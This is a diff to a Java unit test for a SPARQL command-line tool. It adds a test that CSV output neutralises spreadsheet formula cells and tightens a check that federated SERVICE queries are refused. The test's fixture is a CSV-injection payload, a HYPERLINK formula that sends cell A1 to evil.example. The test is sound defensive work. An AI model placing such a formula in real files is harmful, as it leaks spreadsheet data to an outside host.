@@ -26,6 +26,31 @@ class SparqlCommandTest {
     Path tempDir;
 
     @Test
+    void csvOutputNeutralisesFormulaCells() throws Exception {
+        // A model value that a spreadsheet would run as a formula (SEC-5, attestation finding 4).
+        Path model = Files.writeString(tempDir.resolve("m.ttl"),
+                "<urn:a> <urn:p> \"=HYPERLINK(\\\"https://evil.example/?d=\\\"&A1,\\\"ok\\\")\" .\n");
+        Path csv = tempDir.resolve("out.csv");
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        PrintStream origOut = System.out;
+        System.setOut(new PrintStream(out, true, StandardCharsets.UTF_8));
+        try {
+            int exit = CimPalCli.inProcess().execute("sparql", "--models", model.toString(),
+                    "--query", "SELECT ?o WHERE { ?s ?p ?o }", "--format", "csv");
+            assertThat(exit).isEqualTo(ExitCode.OK);
+            assertThat(CimPalCli.inProcess().execute("sparql", "--models", model.toString(),
+                    "--query", "SELECT ?o WHERE { ?s ?p ?o }", "--output", csv.toString())).isEqualTo(ExitCode.OK);
+        } finally {
+            System.setOut(origOut);
+        }
+
+        for (String text : new String[] {out.toString(StandardCharsets.UTF_8), Files.readString(csv)}) {
+            String cell = text.lines().skip(1).findFirst().orElseThrow();
+            assertThat(cell.startsWith("\"") ? cell.substring(1) : cell).as(text).startsWith("'=HYPERLINK");
+        }
+    }
+
+    @Test
     void serviceQueryIsRefusedWithExit2AndNoRequestIsSent() throws Exception {
         Path model = Files.writeString(tempDir.resolve("m.ttl"), "<urn:a> <urn:p> \"x\" .\n");
         String results = "{\"head\":{\"vars\":[\"s\"]},\"results\":{\"bindings\":[]}}";
@@ -44,7 +69,10 @@ class SparqlCommandTest {
 
             assertThat(exit).isEqualTo(ExitCode.INVALID_INPUT);
             assertThat(stub.requests()).isEmpty();
-            assertThat(err.toString(StandardCharsets.UTF_8)).contains("SERVICE").doesNotContain("\tat ");
+            // The refusal itself, not some other bad-input error that merely echoes the query.
+            assertThat(err.toString(StandardCharsets.UTF_8))
+                    .contains("SPARQL SERVICE (federated query) is not allowed")
+                    .doesNotContain("Illegal char").doesNotContain("\tat ");
         }
     }
 }
